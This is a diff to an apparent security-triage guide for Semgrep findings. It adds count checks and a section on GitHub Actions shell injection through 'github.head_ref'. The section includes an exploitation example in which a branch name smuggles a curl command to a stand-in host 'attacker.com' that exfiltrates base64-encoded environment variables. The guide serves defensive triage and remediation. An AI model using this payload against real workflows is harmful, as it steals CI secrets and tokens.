@@ -82,19 +82,27 @@ This script:
 
 ## Workflow
 
-### Step 1: Run the Extraction Script
+### Step 1: Run the Extraction Script and Verify Counts
 
-**ALWAYS START HERE** - Run the extraction script (as described above):
+**ALWAYS START HERE** - Run the extraction script with count format first:
 
 ```bash
+# Step 1a: Get counts to verify total findings
+./scripts/extract-semgrep-findings.sh <org-name> count
+
+# Step 1b: Then get the full summary
 ./scripts/extract-semgrep-findings.sh <org-name>
 ```
+
+**CRITICAL COUNT VERIFICATION**: The summary output shows "Total: N findings" at the bottom. This MUST match the sum of all counts from step 1a. If they don't match, the extraction may be truncating results - investigate before proceeding.
 
 Review the script output to understand:
 - Total number of findings across all repos
 - Which repos have the most findings
 - Types of issues detected (by rule ID)
 - Severity distribution (ERROR vs WARNING)
+
+**Note**: Findings are sorted by severity (ERROR first, then WARNING). All ERROR findings appear at the top of the output for immediate attention.
 
 ### Step 2: Triage Findings
 
@@ -221,6 +229,55 @@ When reviewing code in these languages, consult the detailed guides:
 - **Python**: See [python-vulnerabilities.md](python-vulnerabilities.md) for path traversal (`os.path.join`/`pathlib` bypass), pickle/ML deserialization RCE, YAML deserialization, class pollution (prototype pollution equivalent), dynamic import LFI (`importlib.import_module()`), SSTI, eval/exec injection, command injection, SSRF, and SQL injection
 - **NoSQL/MongoDB**: See [nosql-injection.md](nosql-injection.md) for operator injection (`$ne`, `$gt`, `$regex`), `$where` JavaScript injection, and auth bypass patterns across Python, Node.js, Java, Go, and Ruby
 - **XPath Injection**: See [xpath-injection.md](xpath-injection.md) for XPath injection patterns in Python (lxml), Java (javax.xml.xpath), PHP (SimpleXML/DOMXPath), C# (System.Xml.XPath), and Ruby (Nokogiri/REXML) - authentication bypass, data extraction, parameterized query remediation
+
+## GitHub Actions Security (CRITICAL)
+
+GitHub Actions findings require special attention. Rule `yaml.github-actions.security.run-shell-injection` is HIGH SEVERITY:
+
+### Expression Injection Pattern
+
+**Vulnerable code in action.yml or workflow:**
+```yaml
+run: |
+  BRANCH=${{ github.head_ref }}  # DANGEROUS - attacker controls branch name
+```
+
+**Why it's critical:**
+1. `${{ }}` expressions are substituted BEFORE bash execution
+2. `github.head_ref` (PR branch name) is fully controlled by the PR author
+3. Shell metacharacters in branch names are passed directly to bash
+4. Any fork can create a malicious PR
+
+**Branch name restrictions allow:**
+- `$()` - command substitution
+- `${}` - variable expansion
+- `;` `|` `&` - command chaining
+
+**Exploitation:**
+```bash
+# Attacker creates branch:
+git checkout -b 'x$(curl attacker.com/?s=$(env|base64))y'
+# Opens PR → GitHub Actions executes the command substitution
+```
+
+**Impact:**
+- Full environment variable exfiltration
+- Secret theft (if secrets in env at injection time)
+- Repository write access via GITHUB_TOKEN
+- Supply chain attacks
+
+**NOT a false positive if:**
+- The action/workflow is used by ANY other repository
+- The workflow triggers on `pull_request` (exploitable via fork)
+- Even if "internal tool" - other repos using the action are vulnerable
+
+**Remediation:**
+```yaml
+env:
+  HEAD_REF: ${{ github.head_ref }}
+run: |
+  BRANCH="$HEAD_REF"  # Safe - variable not substituted by GitHub
+```
 
 ## Guidelines
 
